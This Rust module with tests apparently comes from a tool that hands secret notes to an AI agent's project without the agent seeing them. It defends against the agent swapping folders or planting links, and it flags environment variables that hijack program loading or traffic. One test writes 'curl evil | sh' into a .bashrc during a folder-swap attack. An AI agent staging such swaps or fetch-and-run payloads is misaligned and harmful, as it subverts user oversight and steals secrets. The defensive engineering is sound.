//! Handing a note to an agent's project without the agent seeing it: `scrpad --write` puts the
//! note in a file, `scrpad --run` puts its `KEY=VALUE` lines in a command's environment. Both run
//! only after the user allows them in scrpad (see `Session::allow`). Nothing here ever puts a
//! note's text in an error message: an agent reads those.

use std::ffi::OsStr;
use std::io::Write as _;
use std::path::{Path, PathBuf};

#[cfg(windows)]
use crate::store::{create_unique_temp, sync_parent};
#[cfg(unix)]
use crate::store::{ignore_unsupported_sync, temp_name};

/// The longest file name most file systems take, in bytes.
const MAX_NAME: usize = 255;

/// The note's title is the file's name: one plain name, never a path.
pub fn check_file_name(title: &str) -> Result<(), String> {
    if title.is_empty() || title == "." || title == ".." {
        Err(format!("“{title}” is not a file name"))
    } else if title.len() > MAX_NAME {
        Err(format!("a file name takes at most {MAX_NAME} bytes"))
    } else if title.chars().any(|c| c.is_control() || matches!(c, '/' | '\\' | ':')) {
        Err("the title holds a / \\ : or a control character; it must be a plain file name".into())
    } else {
        Ok(())
    }
}

/// Where `--write` would put a note, as the dialog shows it.
#[derive(Debug)]
pub struct Target {
    pub path: PathBuf,
    /// A file is there already: the dialog asks to replace it.
    pub exists: bool,
    /// The folder of `path`, opened when asked: the note goes into this folder, never into
    /// another one put at its path while the dialog was open.
    folder: Folder,
}

/// `dir/title`, if scrpad may write it: `dir` an existing absolute folder, and the name free or a
/// plain file (never a link, which could point anywhere, or a folder). Links in `dir` are
/// resolved here, whoever sent it, so the dialog shows the real path.
pub fn target(dir: &Path, title: &str) -> Result<Target, String> {
    check_file_name(title)?;
    if !dir.is_absolute() {
        return Err(format!("{} is not an absolute path", dir.display()));
    }
    let not_a_folder = || format!("{} is not a folder", dir.display());
    let folder = Folder::open(dir).map_err(|_| not_a_folder())?;
    let dir = std::fs::canonicalize(dir).map_err(|_| not_a_folder())?;
    // A link in `dir` changed between the two: the path shown would not be the folder opened.
    if !folder.is_at(&dir) {
        return Err(format!("{} changed while scrpad looked at it", dir.display()));
    }
    let path = dir.join(title);
    match std::fs::symlink_metadata(&path) {
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Target { path, exists: false, folder }),
        Err(e) => Err(format!("{}: {e}", path.display())),
        Ok(m) if m.file_type().is_symlink() => Err(format!("{} is a link; scrpad does not write through links", path.display())),
        Ok(m) if m.is_file() => Ok(Target { path, exists: true, folder }),
        Ok(_) => Err(format!("{} is not a file", path.display())),
    }
}

/// Writes `text` (with a final newline) where `target` says, private to the user and atomically:
/// a temp file next to it, then a rename. Into the folder opened by `target`, and only while the
/// path the dialog showed still leads to it: a folder moved away, or a link put in the path since,
/// is refused, never followed. A rename replaces a link put at the file itself; it never follows
/// it. When `target` found no file, a hard link puts the file in place only if nothing is there.
pub fn write(target: &Target, text: &str) -> Result<(), String> {
    let path = &target.path;
    let (Some(dir), Some(name)) = (path.parent(), path.file_name()) else {
        unreachable!("target() joins a file name to a folder");
    };
    if !target.folder.is_at(dir) {
        return Err(format!("{} is not the folder scrpad asked about any more; ask again", dir.display()));
    }
    let mut text = text.to_owned();
    if !text.ends_with('\n') {
        text.push('\n');
    }
    match target.folder.put(name, text.as_bytes(), target.exists) {
        Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists && !target.exists => {
            Err(format!("{} exists now; ask again to replace it", path.display()))
        }
        result => result.map_err(|e| format!("could not write {}: {e}", path.display())),
    }
}

/// An open folder that `--write` puts a file in.
#[cfg(unix)]
#[derive(Debug)]
struct Folder(std::fs::File);

#[cfg(unix)]
impl Folder {
    /// Opens `dir`, following links; only a folder opens (a FIFO would block a plain open).
    fn open(dir: &Path) -> std::io::Result<Folder> {
        use rustix::fs::{Mode, OFlags};
        let fd = rustix::fs::open(dir, OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC, Mode::empty())?;
        Ok(Folder(fd.into()))
    }

    /// `path` leads to this folder now: the same device and inode.
    fn is_at(&self, path: &Path) -> bool {
        use std::os::unix::fs::MetadataExt;
        match (self.0.metadata(), std::fs::metadata(path)) {
            (Ok(held), Ok(now)) => (held.dev(), held.ino()) == (now.dev(), now.ino()),
            _ => false,
        }
    }

    /// Puts `bytes` in a new private file `name` in this folder, by the open folder and never by
    /// path: a temp file, then a rename over `name` (`replace`) or a hard link that fails if
    /// `name` exists.
    fn put(&self, name: &OsStr, bytes: &[u8], replace: bool) -> std::io::Result<()> {
        use rustix::fs::{AtFlags, Mode, OFlags};
        let flags = OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::NOFOLLOW | OFlags::CLOEXEC;
        let (tmp, file) = loop {
            let tmp = temp_name(name);
            match rustix::fs::openat(&self.0, &tmp, flags, Mode::RUSR | Mode::WUSR) {
                Ok(fd) => break (tmp, std::fs::File::from(fd)),
                Err(rustix::io::Errno::EXIST) => continue,
                Err(e) => return Err(e.into()),
            }
        };
        let result = (|| {
            let mut file = file;
            file.write_all(bytes)?;
            file.sync_all()?;
            drop(file);
            if replace {
                rustix::fs::renameat(&self.0, &tmp, &self.0, name)?;
            } else {
                rustix::fs::linkat(&self.0, &tmp, &self.0, name, AtFlags::empty())?;
            }
            Ok::<_, std::io::Error>(())
        })();
        // After a rename the temp name is gone; otherwise it goes now, the file stays as `name`.
        if result.is_err() || !replace {
            let _ = rustix::fs::unlinkat(&self.0, &tmp, AtFlags::empty());
        }
        result?;
        ignore_unsupported_sync(self.0.sync_all())
    }
}

/// An open folder that `--write` puts a file in. Opened without delete sharing, so neither it nor
/// a folder above it can be renamed or replaced by a junction while the dialog is open.
#[cfg(windows)]
#[derive(Debug)]
struct Folder {
    _handle: std::fs::File,
    /// Where it was when opened, links resolved.
    at: PathBuf,
}

#[cfg(windows)]
impl Folder {
    fn open(dir: &Path) -> std::io::Result<Folder> {
        use std::os::windows::fs::OpenOptionsExt;
        // FILE_SHARE_READ | FILE_SHARE_WRITE, not FILE_SHARE_DELETE; FILE_FLAG_BACKUP_SEMANTICS
        // opens a folder.
        let handle = std::fs::OpenOptions::new().read(true).share_mode(0x1 | 0x2).custom_flags(0x0200_0000).open(dir)?;
        if !handle.metadata()?.is_dir() {
            return Err(std::io::ErrorKind::NotADirectory.into());
        }
        Ok(Folder { _handle: handle, at: std::fs::canonicalize(dir)? })
    }

    fn is_at(&self, path: &Path) -> bool {
        std::fs::canonicalize(path).is_ok_and(|now| now == self.at)
    }

    /// By path, which the open handle keeps leading here.
    fn put(&self, name: &OsStr, bytes: &[u8], replace: bool) -> std::io::Result<()> {
        let path = self.at.join(name);
        let mut tmp = create_unique_temp(&path)?;
        tmp.file_mut().write_all(bytes)?;
        tmp.file_mut().sync_all()?;
        tmp.close();
        if replace {
            std::fs::rename(tmp.path(), &path)?;
            tmp.persisted();
        } else {
            std::fs::hard_link(tmp.path(), &path)?;
            // `tmp` removes its own name when dropped; the file stays under `path`.
        }
        sync_parent(&path)
    }
}

/// The most of a command line the dialog shows, in bytes; the rest is counted, not shown.
const SHOWN_MAX: usize = 300;

/// `argv` as the dialog shows it: each argument quoted as a POSIX shell would need it, so
/// `["sh -c", …]` and `["sh", "-c", …]` look different; control, invisible and
/// direction-changing characters as `$'…'` escapes, never as themselves; and a long line cut
/// short with the number of bytes left out.
pub fn shown_command(argv: &[String]) -> String {
    let full = argv.iter().map(|a| shell_quote(a)).collect::<Vec<_>>().join(" ");
    if full.len() <= SHOWN_MAX {
        return full;
    }
    let cut = (0..=SHOWN_MAX).rev().find(|&i| full.is_char_boundary(i)).unwrap_or(0);
    format!("{}… ({} more bytes)", &full[..cut], full.len() - cut)
}

/// Characters that change how the text around them looks, or show as nothing.
use crate::scan::is_hidden;

fn shell_quote(arg: &str) -> String {
    let plain = |c: char| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c);
    if !arg.is_empty() && arg.chars().all(plain) {
        return arg.to_owned();
    }
    if !arg.chars().any(is_hidden) {
        return format!("'{}'", arg.replace('\'', r"'\''"));
    }
    let mut out = String::from("$'");
    for c in arg.chars() {
        match c {
            '\\' => out.push_str(r"\\"),
            '\'' => out.push_str(r"\'"),
            '\n' => out.push_str(r"\n"),
            '\t' => out.push_str(r"\t"),
            '\r' => out.push_str(r"\r"),
            c if is_hidden(c) && (c as u32) < 0x100 => out.push_str(&format!("\\x{:02x}", c as u32)),
            c if is_hidden(c) => out.push_str(&format!("\\u{:04x}", c as u32)),
            c => out.push(c),
        }
    }
    out.push('\'');
    out
}

/// Whether git would leave `path` out of commits: `None` outside a repository or without git.
/// A local `git check-ignore`, nothing more.
pub fn git_ignored(path: &Path) -> Option<bool> {
    let (dir, name) = (path.parent()?, path.file_name()?);
    let status = std::process::Command::new("git")
        .arg("-C")
        .arg(dir)
        .args(["check-ignore", "-q", "--"])
        .arg(name)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .ok()?;
    match status.code() {
        Some(0) => Some(true),
        Some(1) => Some(false),
        _ => None,
    }
}

/// The `KEY=VALUE` lines of a note, as `.env` files write them: blank lines and `#` comments
/// skipped, an optional `export `, spaces around `=` trimmed, one pair of matching quotes taken
/// off. No escapes, no `$` expansion. An error names the line, never what it holds.
pub fn parse_env(text: &str) -> Result<Vec<(String, String)>, String> {
    let mut vars = Vec::new();
    for (i, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let line = line.strip_prefix("export ").unwrap_or(line);
        let bad = || format!("line {} is not KEY=VALUE", i + 1);
        let (key, value) = line.split_once('=').ok_or_else(bad)?;
        let key = key.trim();
        let mut chars = key.chars();
        let valid =
            chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_') && chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
        if !valid {
            return Err(bad());
        }
        let value = value.trim();
        let value = [('"', '"'), ('\'', '\'')]
            .iter()
            .find_map(|&(open, close)| value.strip_prefix(open)?.strip_suffix(close))
            .filter(|_| value.len() >= 2)
            .unwrap_or(value);
        if vars.iter().any(|(seen, _): &(String, String)| seen.eq_ignore_ascii_case(key)) {
            return Err(format!("line {} repeats a key", i + 1));
        }
        vars.push((key.to_owned(), value.to_owned()));
    }
    if vars.is_empty() {
        return Err("the note holds no KEY=VALUE lines".into());
    }
    Ok(vars)
}

/// How a variable name matches a risky entry.
enum Shape {
    Exact(&'static str),
    Prefix(&'static str),
    Suffix(&'static str),
}

/// Names that change how programs load, start or talk, each with the reason shown to the user. A
/// sample of the obvious, not a list of what is safe: a name that is not here says nothing.
/// Matching ignores case, as Windows does and as proxy variables are written both ways.
const RISKY: &[(Shape, &str)] = &[
    // Loading and starting.
    (Shape::Exact("PATH"), "changes which programs start"),
    (Shape::Prefix("LD_"), "changes how programs are loaded"),
    (Shape::Prefix("DYLD_"), "changes how programs are loaded"),
    (Shape::Exact("BASH_ENV"), "runs a file when a shell starts"),
    (Shape::Exact("ENV"), "runs a file when a shell starts"),
    (Shape::Exact("ZDOTDIR"), "changes which shell startup files run"),
    (Shape::Exact("NODE_OPTIONS"), "changes how Node starts"),
    (Shape::Exact("NODE_PATH"), "changes which Node modules load"),
    (Shape::Prefix("PYTHON"), "changes how Python starts"),
    (Shape::Exact("RUBYOPT"), "changes how Ruby starts"),
    (Shape::Exact("RUBYLIB"), "changes which Ruby code loads"),
    (Shape::Exact("PERL5OPT"), "changes how Perl starts"),
    (Shape::Exact("PERL5LIB"), "changes which Perl code loads"),
    (Shape::Exact("JAVA_TOOL_OPTIONS"), "changes how Java starts"),
    (Shape::Exact("_JAVA_OPTIONS"), "changes how Java starts"),
    (Shape::Exact("JDK_JAVA_OPTIONS"), "changes how Java starts"),
    (Shape::Exact("CLASSPATH"), "changes which Java code loads"),
    (Shape::Prefix("GIT_"), "changes how git behaves"),
    (Shape::Prefix("NPM_CONFIG_"), "changes how npm behaves"),
    // Where programs read their files.
    (Shape::Exact("HOME"), "changes where programs read their files"),
    (Shape::Prefix("XDG_"), "changes where programs read their files"),
    (Shape::Exact("TMPDIR"), "changes where programs keep temporary files"),
    // Where secrets go.
    (Shape::Suffix("_PROXY"), "sends traffic through another server"),
    (Shape::Prefix("SSL_CERT_"), "changes which certificates are trusted"),
    (Shape::Suffix("_CA_BUNDLE"), "changes which certificates are trusted"),
    (Shape::Exact("NODE_EXTRA_CA_CERTS"), "changes which certificates are trusted"),
    (Shape::Suffix("_BASE_URL"), "changes where requests go"),
    (Shape::Suffix("_API_BASE"), "changes where requests go"),
    (Shape::Suffix("_ENDPOINT"), "changes where requests go"),
];

/// Why a variable name is worth a second look, as `PATH: <reason>` reads, or `None`.
pub fn risky_reason(name: &str) -> Option<&'static str> {
    let name = name.to_ascii_uppercase();
    RISKY.iter().find_map(|(shape, reason)| {
        let hit = match shape {
            Shape::Exact(n) => name == *n,
            Shape::Prefix(p) => name.starts_with(p),
            Shape::Suffix(x) => name.ends_with(x),
        };
        hit.then_some(*reason)
    })
}

/// A bare program name resolved against this process's `PATH`; a name with a separator is left
/// as given. A bare name that is not found is an error: it must not be looked up again in the
/// note's `PATH`.
fn resolve_program(program: &str) -> Result<PathBuf, String> {
    if program.contains(['/', std::path::MAIN_SEPARATOR]) {
        return Ok(PathBuf::from(program));
    }
    let not_found = || format!("{program} not found on PATH");
    let path = std::env::var_os("PATH").ok_or_else(not_found)?;
    #[cfg(windows)]
    let extensions: Vec<String> =
        std::env::var("PATHEXT").unwrap_or(".COM;.EXE;.BAT;.CMD".into()).split(';').map(str::to_owned).chain([String::new()]).collect();
    #[cfg(not(windows))]
    let extensions = [String::new()];
    for dir in std::env::split_paths(&path).filter(|d| d.is_absolute()) {
        for ext in &extensions {
            let candidate = dir.join(format!("{program}{ext}"));
            if is_executable(&candidate) {
                return Ok(candidate);
            }
        }
    }
    Err(not_found())
}

fn is_executable(path: &Path) -> bool {
    let Ok(meta) = std::fs::metadata(path) else { return false };
    #[cfg(unix)]
    return meta.is_file() && std::os::unix::fs::PermissionsExt::mode(&meta.permissions()) & 0o111 != 0;
    #[cfg(not(unix))]
    return meta.is_file();
}

/// Runs `argv` with this terminal's input and output and `env` added to the environment; its
/// exit code (on Unix 128 + the signal that ended it, 127 if it could not start).
pub fn run_child(argv: &[String], env: &[(String, String)]) -> i32 {
    let Some((program, args)) = argv.split_first() else { return 2 };
    let program_path = match resolve_program(program) {
        Ok(path) => path,
        Err(e) => {
            eprintln!("scrpad: {e}");
            return 127;
        }
    };
    let status = std::process::Command::new(program_path).args(args).envs(env.iter().map(|(k, v)| (k, v))).status();
    match status {
        Ok(status) => {
            #[cfg(unix)]
            if let Some(signal) = std::os::unix::process::ExitStatusExt::signal(&status) {
                return 128 + signal;
            }
            status.code().unwrap_or(1)
        }
        Err(e) => {
            eprintln!("scrpad: could not run {program}: {e}");
            127
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::sync::atomic::{AtomicU64, Ordering};

    fn temp_dir(name: &str) -> PathBuf {
        static SEQUENCE: AtomicU64 = AtomicU64::new(0);
        let n = SEQUENCE.fetch_add(1, Ordering::Relaxed);
        let dir = std::env::temp_dir().join(format!("scrpad-handoff-{name}-{}-{n}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::canonicalize(dir).unwrap()
    }

    #[test]
    fn only_plain_file_names_are_targets() {
        for ok in [".env", "config.json", "a b.txt", "ü.toml"] {
            assert!(check_file_name(ok).is_ok(), "{ok}");
        }
        for bad in ["", ".", "..", "../x", "a/b", "a\\b", "C:x", "nul\0", &"x".repeat(256)] {
            assert!(check_file_name(bad).is_err(), "{bad:?}");
        }
    }

    #[test]
    fn the_target_is_checked_before_asking() {
        let dir = temp_dir("target");
        let t = target(&dir, ".env").unwrap();
        assert_eq!((t.path.clone(), t.exists), (dir.join(".env"), false));
        std::fs::write(dir.join(".env"), "OLD=1\n").unwrap();
        assert!(target(&dir, ".env").unwrap().exists);
        std::fs::create_dir(dir.join("sub")).unwrap();
        assert!(target(&dir, "sub").unwrap_err().contains("not a file"));
        assert!(target(&dir.join("missing"), ".env").unwrap_err().contains("folder"));
        assert!(target(Path::new("relative"), ".env").unwrap_err().contains("absolute"));
        assert!(target(&dir, "../.env").is_err());
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink("/etc/passwd", dir.join("link")).unwrap();
            assert!(target(&dir, "link").unwrap_err().contains("link"));
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn writing_is_private_atomic_and_replaces_only_when_told() {
        let dir = temp_dir("write");
        let path = dir.join(".env");
        let asked = target(&dir, ".env").unwrap();
        write(&asked, "A=1").unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=1\n", "a final newline is added");
        // Asked when nothing was there: a file put there since is not replaced.
        assert!(write(&asked, "A=2").unwrap_err().contains("exists"));
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=1\n");
        write(&target(&dir, ".env").unwrap(), "A=2\n").unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "A=2\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
        }
        // No temp file left behind.
        assert_eq!(std::fs::read_dir(&dir).unwrap().count(), 1);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_planted_after_the_dialog_is_never_followed() {
        let dir = temp_dir("race");
        let victim = dir.join("victim");
        std::fs::write(&victim, "keep me").unwrap();
        let path = dir.join(".env");
        let asked_new = target(&dir, ".env").unwrap();
        std::fs::write(&path, "OLD=1\n").unwrap();
        let asked_replace = target(&dir, ".env").unwrap();
        std::fs::remove_file(&path).unwrap();
        std::os::unix::fs::symlink(&victim, &path).unwrap();
        // Not replacing: the link counts as an existing entry.
        assert!(write(&asked_new, "S=1").is_err());
        // Replacing: the link itself is replaced, its target untouched.
        write(&asked_replace, "S=1").unwrap();
        assert_eq!(std::fs::read_to_string(&victim).unwrap(), "keep me");
        assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The attack in the security review: the dialog shows `proj/out/.bashrc`; while it is open
    /// the agent moves `out` away and links `out` to the home folder.
    #[cfg(unix)]
    #[test]
    fn a_folder_swapped_after_the_dialog_is_never_written() {
        let dir = temp_dir("swap");
        let (out, home) = (dir.join("out"), dir.join("home"));
        std::fs::create_dir(&out).unwrap();
        std::fs::create_dir(&home).unwrap();
        std::fs::write(home.join(".bashrc"), "keep me").unwrap();
        std::fs::write(out.join(".bashrc"), "placeholder").unwrap();
        let asked = target(&out, ".bashrc").unwrap();
        assert!(asked.exists);
        std::fs::rename(&out, dir.join("out.x")).unwrap();
        std::os::unix::fs::symlink(&home, &out).unwrap();
        assert!(write(&asked, "curl evil | sh").unwrap_err().contains("ask again"));
        assert_eq!(std::fs::read_to_string(home.join(".bashrc")).unwrap(), "keep me");
        assert_eq!(std::fs::read_to_string(dir.join("out.x/.bashrc")).unwrap(), "placeholder");
        // Moved away and nothing put in its place: refused too, not written where it went.
        std::fs::remove_file(&out).unwrap();
        let asked = target(&dir.join("out.x"), ".bashrc").unwrap();
        std::fs::rename(dir.join("out.x"), &out).unwrap();
        assert!(write(&asked, "A=1").is_err());
        assert_eq!(std::fs::read_to_string(out.join(".bashrc")).unwrap(), "placeholder");
        // A folder higher up swapped the same way.
        let deep = dir.join("a/b");
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::create_dir(home.join("b")).unwrap();
        let asked = target(&deep, ".env").unwrap();
        std::fs::rename(dir.join("a"), dir.join("a.x")).unwrap();
        std::os::unix::fs::symlink(&home, dir.join("a")).unwrap();
        assert!(write(&asked, "A=1").is_err());
        assert!(!home.join("b/.env").exists());
        let _ = std::fs::remove_dir_all(dir);
    }

    #[cfg(unix)]
    #[test]
    fn only_a_folder_opens_as_one() {
        let dir = temp_dir("fifo");
        let fifo = dir.join("fifo");
        assert!(std::process::Command::new("mkfifo").arg(&fifo).status().unwrap().success());
        // Would block forever if opened as a file.
        assert!(target(&fifo, ".env").unwrap_err().contains("not a folder"));
        std::fs::write(dir.join("file"), "").unwrap();
        assert!(target(&dir.join("file"), ".env").unwrap_err().contains("not a folder"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[cfg(unix)]
    #[test]
    fn a_link_in_the_folder_path_is_resolved() {
        let dir = temp_dir("linked");
        std::fs::create_dir(dir.join("real")).unwrap();
        std::os::unix::fs::symlink(dir.join("real"), dir.join("link")).unwrap();
        let t = target(&dir.join("link"), ".env").unwrap();
        assert_eq!(t.path, dir.join("real").join(".env"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn the_command_is_shown_quoted_escaped_and_capped() {
        let shown = |argv: &[&str]| shown_command(&argv.iter().map(|a| (*a).to_owned()).collect::<Vec<_>>());
        assert_eq!(shown(&["npm", "run", "dev"]), "npm run dev");
        assert_eq!(shown(&["sh -c", "x"]), "'sh -c' x");
        assert_eq!(shown(&["sh", "-c", "echo hi"]), "sh -c 'echo hi'");
        assert_eq!(shown(&["", "it's"]), r"'' 'it'\''s'");
        assert_eq!(shown(&["a\nb", "\u{202e}gpj.exe"]), r"$'a\nb' $'\u202egpj.exe'");
        assert_eq!(shown(&["a\u{1b}[2J'\\"]), r"$'a\x1b[2J\'\\'");
        let long = shown(&["x".repeat(70_000).as_str()]);
        assert!(long.len() < 400 && long.ends_with(&format!("… ({} more bytes)", 70_000 - SHOWN_MAX)), "{long}");
        let wide = shown(&["é".repeat(400).as_str()]);
        assert!(wide.starts_with("'é") && wide.contains("more bytes"), "{wide}");
    }

    #[test]
    fn git_ignored_is_unknown_outside_a_repository() {
        let dir = temp_dir("git");
        assert_eq!(git_ignored(&dir.join(".env")), None);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn env_lines_become_variables() {
        let text = "# db\nexport DB_URL=postgres://x\n\nTOKEN = \"sk live\"\nQUOTED='a=b'\nEMPTY=\n";
        assert_eq!(
            parse_env(text).unwrap(),
            [("DB_URL", "postgres://x"), ("TOKEN", "sk live"), ("QUOTED", "a=b"), ("EMPTY", "")].map(|(k, v)| (k.to_owned(), v.to_owned()))
        );
    }

    #[test]
    fn a_bad_line_is_named_by_number_never_by_content() {
        let e = parse_env("A=1\nsk-live-SECRET\n").unwrap_err();
        assert!(e.contains("line 2") && !e.contains("SECRET"), "{e}");
        let e = parse_env("1BAD=sk-live-SECRET").unwrap_err();
        assert!(e.contains("line 1") && !e.contains("SECRET"), "{e}");
        assert!(parse_env("# only comments\n").unwrap_err().contains("no KEY=VALUE"));
    }

    #[test]
    fn a_repeated_key_is_refused_by_line_number_in_any_case() {
        let e = parse_env("A=1\nB=2\na=sk-live-SECRET\n").unwrap_err();
        assert_eq!(e, "line 3 repeats a key");
        let e = parse_env("export PATH=x\nPath=sk-live-SECRET").unwrap_err();
        assert!(e.contains("line 2") && !e.contains("SECRET"), "{e}");
        assert!(parse_env("A=1\nB=1").is_ok());
    }

    #[test]
    fn risky_names_have_a_reason_and_others_none() {
        for name in [
            "PATH",
            "Path",
            "LD_PRELOAD",
            "DYLD_INSERT_LIBRARIES",
            "BASH_ENV",
            "ENV",
            "ZDOTDIR",
            "NODE_OPTIONS",
            "NODE_PATH",
            "PYTHONPATH",
            "PYTHONSTARTUP",
            "RUBYOPT",
            "RUBYLIB",
            "PERL5OPT",
            "PERL5LIB",
            "JAVA_TOOL_OPTIONS",
            "_JAVA_OPTIONS",
            "JDK_JAVA_OPTIONS",
            "CLASSPATH",
            "GIT_SSH_COMMAND",
            "NPM_CONFIG_REGISTRY",
            "npm_config_registry",
            "HOME",
            "XDG_CONFIG_HOME",
            "TMPDIR",
            "HTTPS_PROXY",
            "https_proxy",
            "ALL_PROXY",
            "SSL_CERT_FILE",
            "SSL_CERT_DIR",
            "REQUESTS_CA_BUNDLE",
            "CURL_CA_BUNDLE",
            "NODE_EXTRA_CA_CERTS",
            "OPENAI_BASE_URL",
            "OPENAI_API_BASE",
            "AWS_ENDPOINT",
        ] {
            assert!(risky_reason(name).is_some_and(|r| !r.is_empty() && !r.contains("safe")), "{name}");
        }
        assert_eq!(risky_reason("PATH"), Some("changes which programs start"));
        for name in ["API_KEY", "DATABASE_URL", "OPENAI_API_KEY", "PATHS", "ENVIRONMENT", "MY_HOME", "PROXY", "DEBUG"] {
            assert_eq!(risky_reason(name), None, "{name}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn a_note_path_cannot_swap_the_program() {
        use std::os::unix::fs::PermissionsExt;
        let dir = temp_dir("planted");
        let planted = dir.join("sh");
        std::fs::write(&planted, "#!/bin/sh\nexit 99\n").unwrap();
        std::fs::set_permissions(&planted, std::fs::Permissions::from_mode(0o755)).unwrap();
        let env = [("PATH".to_owned(), dir.display().to_string())];
        // The real `sh` runs, though the note's PATH holds only the planted one.
        assert_eq!(run_child(&["sh".into(), "-c".into(), "exit 7".into()], &env), 7);
        // A name only the note's PATH could find is refused, not run.
        std::fs::write(dir.join("only-in-note"), "#!/bin/sh\nexit 99\n").unwrap();
        std::fs::set_permissions(dir.join("only-in-note"), std::fs::Permissions::from_mode(0o755)).unwrap();
        assert_eq!(run_child(&["only-in-note".into()], &env), 127);
        assert!(resolve_program("only-in-note").unwrap_err().contains("only-in-note not found on PATH"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[cfg(unix)]
    #[test]
    fn the_child_gets_the_variables_and_its_code_is_returned() {
        let env = [("SCRPAD_T".to_owned(), "v1".to_owned())];
        let argv = ["sh", "-c", "test \"$SCRPAD_T\" = v1 && exit 7"].map(String::from);
        assert_eq!(run_child(&argv, &env), 7);
        assert_eq!(run_child(&["/no/such/program".to_owned()], &env), 127);
    }
}
